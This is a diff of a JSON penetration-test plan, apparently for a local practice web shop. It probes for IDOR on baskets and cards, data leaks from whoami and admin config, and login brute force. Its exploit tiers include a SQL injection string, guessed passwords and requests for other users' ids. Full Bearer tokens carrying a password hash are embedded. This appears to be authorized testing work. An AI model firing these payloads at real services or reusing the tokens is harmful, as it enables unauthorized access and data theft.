@@ -1,528 +1,58 @@
 {
   "test_cases": [
     {
-      "id": "TC-H-ADMIN-APP-CONFIG-EXPOSE",
-      "hypothesis_id": "H-ADMIN-APP-CONFIG-EXPOSE",
-      "base_url": "http://localhost:3000",
-      "method": "GET",
-      "endpoint": "/rest/admin/application-configuration",
-      "parameter": "application,baseUrl,trainingData",
-      "header": [
-        {
-          "header_name": "Accept",
-          "header_value": "application/json, text/plain, */*"
-        },
-        {
-          "header_name": "Authorization",
-          "header_value": "Bearer NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
-        }
-      ],
-      "payloads": [
-        {
-          "tier": "benign",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/admin/application-configuration"
-            }
-          ],
-          "description": "Baseline admin config fetch with admin token",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/admin/application-configuration"
-            }
-          ],
-          "description": "Fetch without Authorization header to compare responses",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "exploit",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/admin/application-configuration"
-            }
-          ],
-          "description": "Fetch with admin token to detect sensitive fields",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "login",
-          "description": "Admin credentials required to obtain admin bearer token; bind token to Authorization header"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "sensitive_data_exposed",
-          "condition": "(\"baseUrl\" in response.body) or (\"trainingData\" in response.body) or (\"application\" in response.body)",
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(response.body) - len(baseline.body)) / max(1,len(baseline.body)) > 0.30",
-          "threshold": {
-            "body_length_delta_pct": 30.0
-          },
-          "weight": 0.8
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 10
-      },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "Requires admin token; use test admin account and avoid exposing token. Replace Authorization header value if different.",
-      "tags": [
-        "sensitive",
-        "admin"
-      ],
-      "estimated_duration": 300
-    },
-    {
-      "id": "TC-H-CARDS-GET-IDOR",
-      "hypothesis_id": "H-CARDS-GET-IDOR",
-      "base_url": "http://localhost:3000",
-      "method": "GET",
-      "endpoint": "/api/Cards/{id}",
-      "parameter": "id",
-      "header": [
-        {
-          "header_name": "Accept",
-          "header_value": "application/json, text/plain, */*"
-        },
-        {
-          "header_name": "Authorization",
-          "header_value": "Bearer NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
-        }
-      ],
-      "payloads": [
-        {
-          "tier": "benign",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/api/Cards/7"
-            }
-          ],
-          "description": "Baseline fetch of own card id=7",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/api/Cards/8"
-            }
-          ],
-          "description": "Fetch neighboring card id to check for IDOR/exposure",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "exploit",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/api/Cards/1"
-            }
-          ],
-          "description": "Fetch another likely card id to test access control",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "jwt_refresh",
-          "description": "Valid Bearer token in Authorization header for authenticated access"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "sensitive_data_exposed",
-          "condition": "(\"cardNum\" in response.body) or (\"fullName\" in response.body)",
-          "weight": 1.0
-        },
-        {
-          "signal": "status_code_change",
-          "condition": "response.status_code in [200,403,404] and response.status_code != baseline.status_code",
-          "threshold": {
-            "expected_codes": [
-              200,
-              403,
-              404
-            ]
-          },
-          "weight": 0.9
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 20
-      },
-      "max_retries": 2,
-      "delay_between_requests": 1.0,
-      "notes": "Use authorized test account; do not enumerate many ids. Observe responses for card data leakage.",
-      "tags": [
-        "id_or_authz",
-        "sensitive"
-      ],
-      "estimated_duration": 180
-    },
-    {
-      "id": "TC-H-REST-BASKET-IDOR",
-      "hypothesis_id": "H-REST-BASKET-IDOR",
-      "base_url": "http://localhost:3000",
-      "method": "GET",
-      "endpoint": "/rest/basket/{basketId}",
-      "parameter": "BasketId",
-      "header": [
-        {
-          "header_name": "Accept",
-          "header_value": "application/json, text/plain, */*"
-        },
-        {
-          "header_name": "Authorization",
-          "header_value": "Bearer NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
-        }
-      ],
-      "payloads": [
-        {
-          "tier": "benign",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/basket/6"
-            }
-          ],
-          "description": "Baseline fetch of own basketId=6",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/basket/7"
-            }
-          ],
-          "description": "Request neighboring basketId to detect IDOR via status or content difference",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "exploit",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/basket/1"
-            }
-          ],
-          "description": "Request another likely user basket id to test access control",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "jwt_refresh",
-          "description": "Valid Bearer token in Authorization header for authenticated access"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "status_code_change",
-          "condition": "response.status_code not in baseline.status_code and response.status_code in [200,403,404]",
-          "threshold": {
-            "expected_codes": [
-              200,
-              403,
-              404
-            ]
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(response.body) - len(baseline.body)) / max(1,len(baseline.body)) > 0.40",
-          "threshold": {
-            "body_length_delta_pct": 40.0
-          },
-          "weight": 0.8
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 50
-      },
-      "max_retries": 2,
-      "delay_between_requests": 0.5,
-      "notes": "Conservative id variation; do not attempt high-volume enumeration.",
-      "tags": [
-        "idor",
-        "authorization"
-      ],
-      "estimated_duration": 120
-    },
-    {
-      "id": "TC-H-BASKETITEMS-GET-IDOR",
-      "hypothesis_id": "H-BASKETITEMS-GET-IDOR",
-      "base_url": "http://localhost:3000",
-      "method": "GET",
-      "endpoint": "/api/BasketItems/{itemId}",
-      "parameter": "itemId",
-      "header": [
-        {
-          "header_name": "Accept",
-          "header_value": "application/json, text/plain, */*"
-        },
-        {
-          "header_name": "Authorization",
-          "header_value": "Bearer NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
-        }
-      ],
-      "payloads": [
-        {
-          "tier": "benign",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/api/BasketItems/9"
-            }
-          ],
-          "description": "Baseline fetch of own basket item id=9",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/api/BasketItems/10"
-            }
-          ],
-          "description": "Fetch neighboring item id to test IDOR",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "exploit",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/api/BasketItems/1"
-            }
-          ],
-          "description": "Fetch low id to test access control boundaries",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "jwt_refresh",
-          "description": "Valid Bearer token required"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "status_code_change",
-          "condition": "response.status_code in [200,403,404] and response.status_code != baseline.status_code",
-          "threshold": {
-            "expected_codes": [
-              200,
-              403,
-              404
-            ]
-          },
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(response.body) - len(baseline.body)) / max(1,len(baseline.body)) > 0.40",
-          "threshold": {
-            "body_length_delta_pct": 40.0
-          },
-          "weight": 0.8
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 50
-      },
-      "max_retries": 2,
-      "delay_between_requests": 0.5,
-      "notes": "Use test account and avoid high-volume id scans.",
-      "tags": [
-        "idor",
-        "authorization"
-      ],
-      "estimated_duration": 120
-    },
-    {
-      "id": "TC-H-REST-WHOAMI-INFO-LEAK",
-      "hypothesis_id": "H-REST-WHOAMI-INFO-LEAK",
-      "base_url": "http://localhost:3000",
-      "method": "GET",
-      "endpoint": "/rest/user/whoami",
-      "parameter": "email,lastLoginIp,profileImage,user",
-      "header": [
-        {
-          "header_name": "Accept",
-          "header_value": "application/json, text/plain, */*"
-        },
-        {
-          "header_name": "Authorization",
-          "header_value": "Bearer NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
-        }
-      ],
-      "payloads": [
-        {
-          "tier": "benign",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/user/whoami"
-            }
-          ],
-          "description": "Authenticated baseline returning whoami",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "probe",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/user/whoami?probe=1"
-            }
-          ],
-          "description": "Probe to observe any reflection or body changes",
-          "content_type": "application/json"
-        },
-        {
-          "tier": "exploit",
-          "payloads": [
-            {
-              "location": "path",
-              "value": "/rest/user/whoami?user=__INJECT__"
-            }
-          ],
-          "description": "Probe for reflections/data differences",
-          "content_type": "application/json"
-        }
-      ],
-      "prerequisites": [
-        {
-          "type": "jwt_refresh",
-          "description": "Valid Bearer token present in Authorization header"
-        }
-      ],
-      "oracle_rules": [
-        {
-          "signal": "sensitive_data_exposed",
-          "condition": "(\"ggggg@mail.com\" in response.body) or (\"/assets/public/images/uploads/default.svg\" in response.body)",
-          "weight": 1.0
-        },
-        {
-          "signal": "response_length_diff",
-          "condition": "abs(len(response.body) - len(baseline.body)) / max(1,len(baseline.body)) > 0.30",
-          "threshold": {
-            "body_length_delta_pct": 30.0
-          },
-          "weight": 0.8
-        }
-      ],
-      "pass_logic": "any",
-      "safety": {
-        "idempotent_required": true,
-        "destructive_ok": false,
-        "max_requests": 20
-      },
-      "max_retries": 1,
-      "delay_between_requests": 0.5,
-      "notes": "Authenticated baseline required. Avoid altering account state.",
-      "tags": [
-        "info_leak",
-        "whoami"
-      ],
-      "estimated_duration": 60
-    },
-    {
-      "id": "TC-H-REST-LOGIN-BRUTE-FORCE",
-      "hypothesis_id": "H-REST-LOGIN-BRUTE-FORCE",
+      "id": "exec-1-auth",
+      "hypothesis_id": "hypo-015",
       "base_url": "http://localhost:3000",
       "method": "POST",
       "endpoint": "/rest/user/login",
-      "parameter": "email,password",
-      "header": [
-        {
-          "header_name": "Accept",
-          "header_value": "application/json, text/plain, */*"
-        },
-        {
-          "header_name": "Content-Type",
-          "header_value": "application/json"
-        }
-      ],
+      "parameter": "email",
       "payloads": [
         {
           "tier": "benign",
           "payloads": [
             {
               "location": "body",
-              "value": "{\"email\":\"testuser@example.com\",\"password\":\"CorrectHorseBattery\"}"
+              "value": "{\"email\":\"user@example.com\",\"password\":\"correcthorsebatterystaple\"}"
             }
           ],
-          "description": "Single benign login attempt with valid credentials to record baseline",
+          "description": "Establish valid session/token baseline",
           "encoding": "utf-8",
-          "content_type": "application/json"
+          "content_type": "application/json",
+          "header": []
         },
         {
           "tier": "probe",
           "payloads": [
             {
               "location": "body",
-              "value": "{\"email\":\"testuser@example.com\",\"password\":\"wrongpass1\"}"
+              "value": "{\"email\":\"user@example.com\",\"password\":\"wrongpass\"}"
             }
           ],
-          "description": "Small number of incorrect attempts to detect rate limiting or lockout",
+          "description": "Single invalid attempt to observe status/timing",
           "encoding": "utf-8",
-          "content_type": "application/json"
+          "content_type": "application/json",
+          "header": []
         },
         {
           "tier": "exploit",
           "payloads": [
             {
               "location": "body",
-              "value": "{\"email\":\"testuser@example.com\",\"password\":\"wrongpass2\"}"
+              "value": "{\"email\":\"user@example.com\",\"password\":\"password1\"}"
             }
           ],
-          "description": "Additional incorrect attempts within max_requests to trigger rate limit signals",
+          "description": "Additional safe attempts to detect lockout/rate-limit behavior",
           "encoding": "utf-8",
-          "content_type": "application/json"
+          "content_type": "application/json",
+          "header": []
         }
       ],
-      "prerequisites": [
-        {
-          "type": "custom",
-          "description": "Use non-privileged test account; no auth required"
-        }
-      ],
+      "prerequisites": [],
       "oracle_rules": [
         {
           "signal": "status_code_change",
-          "condition": "response.status_code in [200,401,429] and response.status_code != baseline.status_code",
+          "condition": "response.status_code in [200,401,429] across attempts",
           "threshold": {
             "expected_codes": [
               200,
@@ -538,7 +68,213 @@
           "threshold": {
             "timing_ms": 2000
           },
-          "weight": 0.6
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 50
+      },
+      "max_retries": 2,
+      "delay_between_requests": 2.0,
+      "notes": "Run first to obtain auth token if successful; stop if 429 returned",
+      "tags": [
+        "auth",
+        "bruteforce"
+      ],
+      "estimated_duration": 10
+    },
+    {
+      "id": "exec-2-whoami",
+      "hypothesis_id": "hypo-001",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/rest/user/whoami",
+      "parameter": "user",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"user\":\"current\"}"
+            }
+          ],
+          "description": "Authorized baseline using token from exec-1 if available",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"user\":\"\"}"
+            }
+          ],
+          "description": "Authorized probe with blank user",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"user\":\"admin' OR 1=1 --\"}"
+            }
+          ],
+          "description": "Safe crafted probe to detect info disclosure",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Use token from exec-1 if available; otherwise run exec-1 first",
+          "extract_from": "previous_step",
+          "bind_to": "Authorization"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "sensitive_data_exposed",
+          "condition": "response.body contains \"email\" or response.body contains \"id\"",
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "response.status_code in [200,401] (compare authorized vs no-auth)",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Run after auth to compare authorized vs missing/invalid token",
+      "tags": [
+        "info_disclosure",
+        "auth_bypass"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "exec-3-idor-basket",
+      "hypothesis_id": "hypo-002",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/rest/basket/6",
+      "parameter": "BasketId",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "6"
+            }
+          ],
+          "description": "Baseline fetch for BasketId=6 with Authorization header",
+          "content_type": "*/*",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "7"
+            }
+          ],
+          "description": "Probe other BasketId to observe access control",
+          "content_type": "*/*",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "1"
+            }
+          ],
+          "description": "Probe accessing a different known id (1) to check for leakage (safe probe)",
+          "content_type": "*/*",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJnZ2dnZ0BtYWlsLmNvbSIsInBhc3N3b3JkIjoiOWEwZmUyN2M4YmNjOWFhZDUxZWRhNTVlMWI3MzVlYjUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTE1IDA2OjM4OjU2Ljc4NiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NTUyMzk5NDZ9.NvVTXZsk8zrJqC1BIESlmzmMwy3o646U8KHx0Y8bu1Vf-tqIp5oii9hatVub2JERDq9OYCEHaM8wPJBlZvAI8QLm3GUBgWITFO7d_sCWHEuvAY1XMZYcDxgtoP08Wxv0H9_NZVGBQ7wMddu0tWLMwPjhxmtO4MoypcLEhMoNxOg"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Have valid Authorization Bearer token (from exec-1)",
+          "extract_from": "previous_step",
+          "bind_to": "Authorization"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "sensitive_data_exposed",
+          "condition": "response.body contains \"UserId\" or response.body contains \"Products\"",
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "response.status_code in [200,403,404] across probes",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
         }
       ],
       "pass_logic": "any",
@@ -547,40 +283,46 @@
         "destructive_ok": false,
         "max_requests": 20
       },
-      "max_retries": 1,
-      "delay_between_requests": 1.0,
-      "notes": "Limit incorrect attempts; stop on 429. Use test account only.",
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Run after auth; stop if unexpected 200 on probes indicating potential IDOR",
       "tags": [
-        "auth",
-        "bruteforce"
+        "idor",
+        "authz"
       ],
-      "estimated_duration": 180
+      "estimated_duration": 3
     }
   ],
   "global_prerequisites": [
     {
       "type": "login",
-      "description": "Obtain valid JWT or session cookie for endpoints requiring authorization; bind to Authorization header or Cookie"
+      "description": "Valid session cookie or Authorization Bearer token must be available for endpoints requiring auth",
+      "extract_from": "first_successful_login_response",
+      "bind_to": "Authorization"
     }
   ],
   "execution_hints": [
     {
-      "key": "max_concurrent",
+      "key": "chain_order",
+      "value": "auth -> info_gathering (whoami,basket) -> idor/address/card checks -> state-changing probes (basket modifications) -> payment/account tests"
+    },
+    {
+      "key": "rate_limit_req_per_sec",
       "value": "1"
     },
     {
-      "key": "respect_rate_limits",
+      "key": "stop_on_429_or_unexpected_200",
       "value": "true"
     },
     {
-      "key": "stop_on_signal",
-      "value": "status_code_change=429"
+      "key": "max_total_requests",
+      "value": "200"
     }
   ],
   "metadata": [
     {
-      "key": "session_management",
-      "value": "jwt (observed Bearer token in Authorization header)"
+      "key": "source",
+      "value": "HAR parsed SPA traffic"
     }
   ]
 }
